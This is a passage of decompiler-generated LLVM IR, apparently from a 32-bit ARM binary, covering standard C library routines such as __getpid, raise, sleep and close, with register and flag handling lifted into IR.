  store i32 %v0_14748, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1474c

dec_label_pc_1474c:                               ; preds = %dec_label_pc_147cc.dec_label_pc_1474c_crit_edge, %entry
  %v0_14750 = phi i32 [ %v0_14750.pre, %dec_label_pc_147cc.dec_label_pc_1474c_crit_edge ], [ %v0_14748, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_14750, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1475817 = inttoptr i32 %v0_14750 to i32*
  %v2_1475818 = load i32, i32* %v1_1475817, align 4
  %v3_1475c20 = icmp ne i32 %v2_1475818, 0
  store i1 %v3_1475c20, i1* %cpsr_c.global-to-local, align 1
  %v9_1475c26 = icmp eq i32 %v2_1475818, 1
  br i1 %v9_1475c26, label %dec_label_pc_14764, label %dec_label_pc_1477c

dec_label_pc_14764:                               ; preds = %dec_label_pc_1474c, %dec_label_pc_14764.dec_label_pc_14758_crit_edge
  %v0_1476427 = phi i32 [ %v1_1475c.pre, %dec_label_pc_14764.dec_label_pc_14758_crit_edge ], [ 1, %dec_label_pc_1474c ]
  store i32 %v0_1476427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14774 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14774, label %dec_label_pc_14778, label %dec_label_pc_14764.dec_label_pc_14758_crit_edge

dec_label_pc_14764.dec_label_pc_14758_crit_edge:  ; preds = %dec_label_pc_14764
  %v0_14758.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1475c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14758 = inttoptr i32 %v0_14758.pre to i32*
  %v2_14758 = load i32, i32* %v1_14758, align 4
  %v3_1475c = icmp uge i32 %v2_14758, %v1_1475c.pre
  store i1 %v3_1475c, i1* %cpsr_c.global-to-local, align 1
  %v9_1475c = icmp eq i32 %v2_14758, %v1_1475c.pre
  br i1 %v9_1475c, label %dec_label_pc_14764, label %dec_label_pc_1477c

dec_label_pc_14778:                               ; preds = %dec_label_pc_14764
  %v0_14778 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1477c

dec_label_pc_1477c:                               ; preds = %dec_label_pc_1474c, %dec_label_pc_14764.dec_label_pc_14758_crit_edge, %dec_label_pc_14778
  %v0_1477c = phi i32 [ %v0_14778, %dec_label_pc_14778 ], [ %v2_1475818, %dec_label_pc_1474c ], [ %v2_14758, %dec_label_pc_14764.dec_label_pc_14758_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1477c = icmp eq i32 %v0_1477c, 0
  %v0_147a0.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1477c, label %dec_label_pc_1479c, label %dec_label_pc_14784

dec_label_pc_14784:                               ; preds = %dec_label_pc_1477c
  store i32 %v0_147a0.pre, i32* %r0.global-to-local, align 4
  %v0_14788 = load i32, i32* %r1.global-to-local, align 4
  %v1_14788 = add i32 %v0_14788, 126
  store i32 %v1_14788, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %dec_label_pc_1477c, %dec_label_pc_14784
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_147a0.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_147a828 = inttoptr i32 %v0_147a0.pre to i32*
  %v2_147a829 = load i32, i32* %v1_147a828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_147ac36 = icmp eq i32 %v2_147a829, 0
  br i1 %v9_147ac36, label %dec_label_pc_147b4, label %dec_label_pc_147cc

dec_label_pc_147b4:                               ; preds = %dec_label_pc_1479c, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge
  %v0_147b437 = phi i32 [ %v1_147ac.pre, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge ], [ 0, %dec_label_pc_1479c ]
  store i32 %v0_147b437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_147c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_147c4, label %dec_label_pc_147c8, label %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge

dec_label_pc_147b4.dec_label_pc_147a8_crit_edge:  ; preds = %dec_label_pc_147b4
  %v0_147a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_147ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_147a8 = inttoptr i32 %v0_147a8.pre to i32*
  %v2_147a8 = load i32, i32* %v1_147a8, align 4
  %v3_147ac = icmp uge i32 %v2_147a8, %v1_147ac.pre
  store i1 %v3_147ac, i1* %cpsr_c.global-to-local, align 1
  %v9_147ac = icmp eq i32 %v2_147a8, %v1_147ac.pre
  br i1 %v9_147ac, label %dec_label_pc_147b4, label %dec_label_pc_147cc

dec_label_pc_147c8:                               ; preds = %dec_label_pc_147b4
  %v0_147c8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147cc

dec_label_pc_147cc:                               ; preds = %dec_label_pc_1479c, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge, %dec_label_pc_147c8
  %v0_147cc = phi i32 [ %v0_147c8, %dec_label_pc_147c8 ], [ %v2_147a829, %dec_label_pc_1479c ], [ %v2_147a8, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge ]
  %v1_147cc = phi i32 [ %v0_147c8, %dec_label_pc_147c8 ], [ 0, %dec_label_pc_1479c ], [ %v1_147ac.pre, %dec_label_pc_147b4.dec_label_pc_147a8_crit_edge ]
  %v3_147cc = icmp uge i32 %v0_147cc, %v1_147cc
  store i1 %v3_147cc, i1* %cpsr_c.global-to-local, align 1
  %v9_147cc = icmp eq i32 %v0_147cc, %v1_147cc
  br i1 %v9_147cc, label %dec_label_pc_147d4, label %dec_label_pc_147cc.dec_label_pc_1474c_crit_edge

dec_label_pc_147cc.dec_label_pc_1474c_crit_edge:  ; preds = %dec_label_pc_147cc
  %v0_14750.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1474c

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147cc
  %v2_147d4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_147d4, i32* %r4.global-to-local, align 4
  %v1_147d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_147d8

; uselistorder directives
  uselistorder i32 %v0_147c8, { 1, 0 }
  uselistorder i32 %v1_147ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1475c.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1475818, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147b4, { 1, 0 }
  uselistorder label %dec_label_pc_1479c, { 1, 0 }
  uselistorder label %dec_label_pc_1477c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14764, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_147dc = load i32, i32* @r7, align 4
  store i32 %v3_147dc, i32* %stack_var_-8, align 4
  %v0_147e0 = call i32 @__aeabi_read_tp()
  store i32 %v0_147e0, i32* %r0.global-to-local, align 4
  %v1_147e4 = add i32 %v0_147e0, -1060
  %v2_147e4 = inttoptr i32 %v1_147e4 to i32*
  %v3_147e4 = load i32, i32* %v2_147e4, align 4
  %tmp7 = icmp slt i32 %v3_147e4, 1
  br i1 %tmp7, label %dec_label_pc_147f4, label %dec_label_pc_14818

dec_label_pc_147f4:                               ; preds = %entry
  %v2_147e8 = icmp eq i32 %v3_147e4, 0
  br i1 %v2_147e8, label %dec_label_pc_147f8, label %dec_label_pc_14804

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147f4
  %v1_147f8 = add i32 %v0_147e0, -1064
  %v2_147f8 = inttoptr i32 %v1_147f8 to i32*
  %v3_147f8 = load i32, i32* %v2_147f8, align 4
  store i32 %v3_147f8, i32* %r0.global-to-local, align 4
  %v2_147fc = icmp eq i32 %v3_147f8, 0
  br i1 %v2_147fc, label %bb, label %bb8

dec_label_pc_14804:                               ; preds = %dec_label_pc_147f4
  br label %bb8

bb:                                               ; preds = %dec_label_pc_147f8
  store i32 0, i32* %v2_147f8, align 4
  %v0_14814.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_14804, %dec_label_pc_147f8, %bb
  %v0_14814 = phi i32 [ %v3_147f8, %dec_label_pc_147f8 ], [ %v0_147e0, %dec_label_pc_14804 ], [ %v0_14814.pre, %bb ]
  br label %dec_label_pc_14818

dec_label_pc_14818:                               ; preds = %entry, %bb8
  %v0_14818 = phi i32 [ %v3_147e4, %entry ], [ %v0_14814, %bb8 ]
  store i32 %v0_14818, i32* %r0.global-to-local, align 4
  %v2_1481c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1481c, i32* @r7, align 4
  ret i32 %v0_14818

; uselistorder directives
  uselistorder i32 %v0_14818, { 1, 0 }
  uselistorder i32 %v3_147e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14818, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14824 = load i32, i32* @r4, align 4
  store i32 %v3_14824, i32* %stack_var_-20, align 4
  %v0_1482c = call i32 @__aeabi_read_tp()
  store i32 %v0_1482c, i32* %r0.global-to-local, align 4
  %v1_14830 = add i32 %v0_1482c, -1064
  %v2_14830 = inttoptr i32 %v1_14830 to i32*
  %v3_14830 = load i32, i32* %v2_14830, align 4
  store i32 %v3_14830, i32* %r4.global-to-local, align 4
  %v2_14834 = icmp eq i32 %v3_14830, 0
  %v1_1483c = add i32 %v0_1482c, -1060
  %v2_1483c = inttoptr i32 %v1_1483c to i32*
  %v3_1483c = load i32, i32* %v2_1483c, align 4
  store i32 %v3_1483c, i32* %r0.global-to-local, align 4
  br i1 %v2_14834, label %dec_label_pc_14844, label %dec_label_pc_14858

dec_label_pc_14844:                               ; preds = %entry
  store i32 %v3_1483c, i32* %r4.global-to-local, align 4
  store i32 %v3_1483c, i32* %v2_14830, align 4
  %v0_14880.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_14858:                               ; preds = %entry
  %v5_1485c = icmp sgt i32 %v3_1483c, 0
  br i1 %v5_1485c, label %bb28, label %dec_label_pc_14860

dec_label_pc_14860:                               ; preds = %dec_label_pc_14858
  %tmp = bitcast i32 %v3_1483c to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_14860 = bitcast float %tmp30 to i32
  %v2_14864 = icmp eq i32 %v1_14860, 0
  br i1 %v2_14864, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14860
  store i32 %v3_14830, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_14860
  %v2_1486c = sub i32 0, %v3_1483c
  store i32 %v2_1486c, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_14858, %dec_label_pc_14844, %.thread
  %v0_14884 = phi i32 [ %v3_1483c, %dec_label_pc_14858 ], [ %v0_14880.pre, %dec_label_pc_14844 ], [ %v3_14830, %bb ], [ %v2_1486c, %.thread ]
  store i32 %v0_14884, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_14884, -4095
  br i1 %tmp31, label %dec_label_pc_148a8, label %dec_label_pc_14890

dec_label_pc_14890:                               ; preds = %bb28
  %v0_14894 = call i32 @__aeabi_read_tp()
  %v3_14898 = load i16, i16* @global_var_2225c.361, align 2
  %v4_14898 = sext i16 %v3_14898 to i32
  %v0_1489c = load i32, i32* %r2.global-to-local, align 4
  %v1_1489c = sub i32 0, %v0_1489c
  store i32 %v1_1489c, i32* %r2.global-to-local, align 4
  %v3_148a0 = add i32 %v4_14898, %v0_14894
  %v4_148a0 = inttoptr i32 %v3_148a0 to i32*
  store i32 %v1_1489c, i32* %v4_148a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148a8

dec_label_pc_148a8:                               ; preds = %bb28, %dec_label_pc_14890
  %v0_148ac = phi i32 [ %v0_14884, %bb28 ], [ -1, %dec_label_pc_14890 ]
  %v3_148a8 = icmp eq i32 %v0_148ac, -1
  store i32 %v0_148ac, i32* %r5.global-to-local, align 4
  br i1 %v3_148a8, label %dec_label_pc_148b4, label %dec_label_pc_148fc

dec_label_pc_148b4:                               ; preds = %dec_label_pc_148a8
  %v0_148b8 = call i32 @__aeabi_read_tp()
  store i32 %v0_148b8, i32* %r0.global-to-local, align 4
  %v3_148bc = load i16, i16* @global_var_2225c.361, align 2
  %v4_148bc = sext i16 %v3_148bc to i32
  %v2_148c0 = add i32 %v4_148bc, %v0_148b8
  %v3_148c0 = inttoptr i32 %v2_148c0 to i32*
  %v4_148c0 = load i32, i32* %v3_148c0, align 4
  %v7_148c4 = icmp eq i32 %v4_148c0, 38
  br i1 %v7_148c4, label %dec_label_pc_148d0, label %dec_label_pc_148b4.dec_label_pc_148fc_crit_edge

dec_label_pc_148b4.dec_label_pc_148fc_crit_edge:  ; preds = %dec_label_pc_148b4
  %v0_148fc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148fc

dec_label_pc_148d0:                               ; preds = %dec_label_pc_148b4
  %v0_148d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_148d0, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_148d0, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_148d0
  %v5_148e8 = sub i32 0, %v0_148d0
  store i32 %v5_148e8, i32* %r2.global-to-local, align 4
  %v7_148ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_148f4.538 to i32), i32 55656) to i32*), align 4
  %v4_148f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_148f0, i32* %r0.global-to-local, align 4
  %v7_148f4 = add i32 %v7_148ec, %v0_148b8
  %v8_148f4 = inttoptr i32 %v7_148f4 to i32*
  store i32 %v5_148e8, i32* %v8_148f4, align 4
  %v0_148f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_148d0, %bb29
  %v0_148f8 = phi i32 [ %v0_148f8.pre, %bb29 ], [ %v0_148d0, %dec_label_pc_148d0 ]
  store i32 %v0_148f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148fc

dec_label_pc_148fc:                               ; preds = %dec_label_pc_148b4.dec_label_pc_148fc_crit_edge, %dec_label_pc_148a8, %.thread22
  %v0_148fc = phi i32 [ %v0_148fc.pre, %dec_label_pc_148b4.dec_label_pc_148fc_crit_edge ], [ %v0_148ac, %dec_label_pc_148a8 ], [ %v0_148f8, %.thread22 ]
  store i32 %v0_148fc, i32* %r0.global-to-local, align 4
  %v2_14900 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14900, i32* @r4, align 4
  ret i32 %v0_148fc

; uselistorder directives
  uselistorder i32 %v0_148fc, { 1, 0 }
  uselistorder i32 %v0_148d0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14884, { 2, 0, 1 }
  uselistorder i32 %v3_1483c, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_148fc, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_148a8, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_14914 = load i32, i32* @r4, align 4
  %v6_14914 = load i32, i32* @r5, align 4
  %v9_14914 = load i32, i32* @r6, align 4
  %v12_14914 = load i32, i32* @r7, align 4
  %v15_14914 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14924 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_14924, label %dec_label_pc_14938, label %dec_label_pc_149ac

dec_label_pc_14938:                               ; preds = %entry
  %v0_14938 = call i32 @__aeabi_read_tp()
  %v1_1493c = add i32 %v0_14938, -1036
  %v2_1493c = inttoptr i32 %v1_1493c to i32*
  %v3_1493c = load i32, i32* %v2_1493c, align 4
  %v1_14940 = and i32 %v3_1493c, -71
  %v2_14944 = icmp ugt i32 %v1_14940, 7
  store i1 %v2_14944, i1* %cpsr_c.global-to-local, align 1
  %v7_14944 = icmp eq i32 %v1_14940, 8
  %v1_14948 = add i32 %v0_14938, -1168
  store i32 %v1_14948, i32* @r5, align 4
  br i1 %v7_14944, label %dec_label_pc_14950, label %dec_label_pc_14a24

dec_label_pc_14950:                               ; preds = %dec_label_pc_14938
  %v2_14954 = add i32 %v0_14938, -624
  %v3_14954 = inttoptr i32 %v2_14954 to i32*
  store i32 -1, i32* %v3_14954, align 4
  %v0_14958 = load i32, i32* @r5, align 4
  %v1_14958 = add i32 %v0_14958, 132
  store i32 %v1_14958, i32* @r6, align 4
  br label %dec_label_pc_1495c

dec_label_pc_1495c:                               ; preds = %dec_label_pc_14990.dec_label_pc_1495c_crit_edge, %dec_label_pc_14950
  %v0_14960 = phi i32 [ %v0_14960.pre, %dec_label_pc_14990.dec_label_pc_1495c_crit_edge ], [ %v1_14958, %dec_label_pc_14950 ]
  %v0_1495c = phi i32 [ %v0_14998, %dec_label_pc_14990.dec_label_pc_1495c_crit_edge ], [ %v0_14958, %dec_label_pc_14950 ]
  %v1_1495c = add i32 %v0_1495c, 132
  %v2_1495c = inttoptr i32 %v1_1495c to i32*
  %v3_1495c = load i32, i32* %v2_1495c, align 4
  store i32 %v0_14960, i32* %r2.global-to-local, align 4
  store i32 %v3_1495c, i32* @r4, align 4
  %v1_1496c30 = inttoptr i32 %v0_14960 to i32*
  %v2_1496c31 = load i32, i32* %v1_1496c30, align 4
  %v3_1497033 = icmp uge i32 %v2_1496c31, %v3_1495c
  store i1 %v3_1497033, i1* %cpsr_c.global-to-local, align 1
  %v9_1497039 = icmp eq i32 %v2_1496c31, %v3_1495c
  br i1 %v9_1497039, label %dec_label_pc_14978, label %dec_label_pc_14990

dec_label_pc_14978:                               ; preds = %dec_label_pc_1495c, %dec_label_pc_14978.dec_label_pc_1496c_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14988 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14988, label %dec_label_pc_1498c, label %dec_label_pc_14978.dec_label_pc_1496c_crit_edge

dec_label_pc_14978.dec_label_pc_1496c_crit_edge:  ; preds = %dec_label_pc_14978
  %v0_1496c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14970.pre = load i32, i32* @r4, align 4
  %v1_1496c = inttoptr i32 %v0_1496c.pre to i32*
  %v2_1496c = load i32, i32* %v1_1496c, align 4
  %v3_14970 = icmp uge i32 %v2_1496c, %v1_14970.pre
  store i1 %v3_14970, i1* %cpsr_c.global-to-local, align 1
  %v9_14970 = icmp eq i32 %v2_1496c, %v1_14970.pre
  br i1 %v9_14970, label %dec_label_pc_14978, label %dec_label_pc_14990

dec_label_pc_1498c:                               ; preds = %dec_label_pc_14978
  %v0_1498c = load i32, i32* @r4, align 4
  br label %dec_label_pc_14990

dec_label_pc_14990:                               ; preds = %dec_label_pc_1495c, %dec_label_pc_14978.dec_label_pc_1496c_crit_edge, %dec_label_pc_1498c
  %v0_14990 = phi i32 [ %v0_1498c, %dec_label_pc_1498c ], [ %v2_1496c31, %dec_label_pc_1495c ], [ %v2_1496c, %dec_label_pc_14978.dec_label_pc_1496c_crit_edge ]
  %v1_14990 = phi i32 [ %v0_1498c, %dec_label_pc_1498c ], [ %v3_1495c, %dec_label_pc_1495c ], [ %v1_14970.pre, %dec_label_pc_14978.dec_label_pc_1496c_crit_edge ]
  %v3_14990 = icmp uge i32 %v0_14990, %v1_14990
  store i1 %v3_14990, i1* %cpsr_c.global-to-local, align 1
  %v9_14990 = icmp eq i32 %v0_14990, %v1_14990
  br i1 %v9_14990, label %dec_label_pc_14998, label %dec_label_pc_14990.dec_label_pc_1495c_crit_edge

dec_label_pc_14990.dec_label_pc_1495c_crit_edge:  ; preds = %dec_label_pc_14990
  %v0_14998 = load i32, i32* @r5, align 4
  %v0_14960.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1495c

dec_label_pc_14998:                               ; preds = %dec_label_pc_14990
  %v0_149a0 = load i32, i32* @r7, align 4
  %v2_149a0 = add i32 %v0_149a0, 116
  %v3_149a0 = inttoptr i32 %v2_149a0 to i32*
  %v4_149a0 = load i32, i32* %v3_149a0, align 4
  store i32 84396, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_149a0)
  %v0_149b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_149ac

dec_label_pc_149ac:                               ; preds = %entry, %dec_label_pc_14998
  %v0_149b4 = phi i32 [ 0, %entry ], [ %v0_149b4.pre, %dec_label_pc_14998 ]
  %v2_149b8 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_149b8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_149c4 = call i32 @__libc_sigaction(i32 17, i32 %v0_149b4, i32 %v2_149b8)
  %v3_149c8 = load i32, i32* %stack_var_-60, align 4
  %v2_149cc = icmp ne i32 %v3_149c8, 0
  store i1 %v2_149cc, i1* %cpsr_c.global-to-local, align 1
  %v7_149cc = icmp eq i32 %v3_149c8, 1
  br i1 %v7_149cc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_149ac
  %v3_149d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_149d0, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_149ac, %bb
  call void @__pseudo_cond_branch(i1 %v7_149cc, i32 ptrtoint (i32* @global_var_1162c.542 to i32))
  %v2_149e0 = ptrtoint i32* %stack_var_-32 to i32
  %v2_149e8 = call i32 @__libc_nanosleep(i32 %v2_149e0, i32 %v2_149e0)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149ec = icmp eq i32 %v2_149e8, 0
  br i1 %v2_149ec, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_14a00 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_14a00, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14a10 = load i32, i32* %stack_var_-40, align 4
  %v1_14a14 = and i32 %v3_14a10, 65536
  store i32 %v1_14a14, i32* %r2.global-to-local, align 4
  %v2_14a14 = icmp eq i32 %v1_14a14, 0
  br i1 %v2_14a14, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_14a1c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14a1c, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_14a14, i32 ptrtoint (i32* @global_var_1162c.542 to i32))
  br label %dec_label_pc_14a24

dec_label_pc_14a24:                               ; preds = %dec_label_pc_14938, %.thread5
  %v0_14a24 = load i32, i32* @r4, align 4
  store i32 %v3_14914, i32* @r4, align 4
  store i32 %v6_14914, i32* @r5, align 4
  store i32 %v9_14914, i32* @r6, align 4
  store i32 %v12_14914, i32* @r7, align 4
  store i32 %v15_14914, i32* @lr, align 4
  ret i32 %v0_14a24

; uselistorder directives
  uselistorder i32 %v0_1498c, { 1, 0 }
  uselistorder i32 %v1_14970.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a24, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_149ac, { 1, 0 }
  uselistorder label %dec_label_pc_14990, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14978, { 1, 0 }
}

define i32 @function_14a38(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14a38:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_14a38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a38, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14a38
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v2_14a38 = load i32, i32* @r4, align 4
  %v4_14a38 = lshr i32 %v2_14a38, %tmp
  %v5_14a38 = sub nsw i32 32, %tmp
  %v6_14a38 = shl i32 %v2_14a38, %v5_14a38
  %v7_14a38 = or i32 %v6_14a38, %v4_14a38
  %v9_14a38 = and i32 %v7_14a38, %tmp
  store i32 %v9_14a38, i32* %r0.global-to-local, align 4
  %v2_14a40 = trunc i32 %v9_14a38 to i16
  store i16 %v2_14a40, i16* %tmp2, align 2
  %v6_14a40 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14a38, %bb
  %v10_14a40 = phi i32 [ %tmp, %dec_label_pc_14a38 ], [ %v6_14a40, %bb ]
  ret i32 %v10_14a40

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_14a54 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14a54, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14a54 = load i32, i32* @r0, align 4
  ret i32 %v2_14a54

bb1:                                              ; preds = %entry
  %v0_14a58 = call i32 @__syscall_error()
  ret i32 %v0_14a58
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a64 = load i32, i32* @global_var_2541c.545, align 4
  %v2_14a68 = icmp eq i32 %v3_14a64, 0
  store i1 %v2_14a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a68, label %dec_label_pc_14a70, label %entry.dec_label_pc_14a8c_crit_edge

entry.dec_label_pc_14a8c_crit_edge:               ; preds = %entry
  %v3_14a8c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14a8c

dec_label_pc_14a70:                               ; preds = %entry
  %v0_14a70 = load i32, i32* @r7, align 4
  store i32 %v0_14a70, i32* @ip, align 4
  %v0_14a80 = load i32, i32* @r0, align 4
  %v2_14a80 = icmp ugt i32 %v0_14a80, -4097
  %v7_14a80 = icmp eq i32 %v0_14a80, -4096
  store i1 %v7_14a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a80, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_14a8c, %dec_label_pc_14a70
  %merge = phi i32 [ %v0_14a80, %dec_label_pc_14a70 ], [ %v0_14ab0, %dec_label_pc_14a8c ], [ %v0_14ac0, %bb8 ], [ %v6_14ad0, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_14a70
  %v0_14a88 = call i32 @__syscall_error()
  br label %dec_label_pc_14a8c

dec_label_pc_14a8c:                               ; preds = %entry.dec_label_pc_14a8c_crit_edge, %bb7
  %v3_14a8c = phi i32 [ %v3_14a8c.pre, %entry.dec_label_pc_14a8c_crit_edge ], [ %v0_14a88, %bb7 ]
  %v9_14a8c = load i32, i32* @r7, align 4
  store i32 %v9_14a8c, i32* %stack_var_-8, align 4
  %v12_14a8c = load i32, i32* @lr, align 4
